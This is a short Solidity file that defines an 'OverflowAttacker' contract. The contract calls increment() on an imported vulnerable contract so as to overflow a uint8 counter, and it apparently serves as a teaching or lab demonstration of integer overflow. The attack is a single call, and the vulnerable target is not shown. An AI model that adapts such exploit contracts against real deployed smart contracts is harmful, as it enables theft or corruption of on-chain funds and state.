// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./VulnerableOverflow.sol";

contract OverflowAttacker {
    VulnerableOverflow public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableOverflow(_vulnerableContract);
    }

    function exploitOverflow() public {
        vulnerableContract.increment(); // This will cause the overflow
    }

    function getSmallNumber() public view returns (uint8) {
        return vulnerableContract.smallNumber();
    }
}
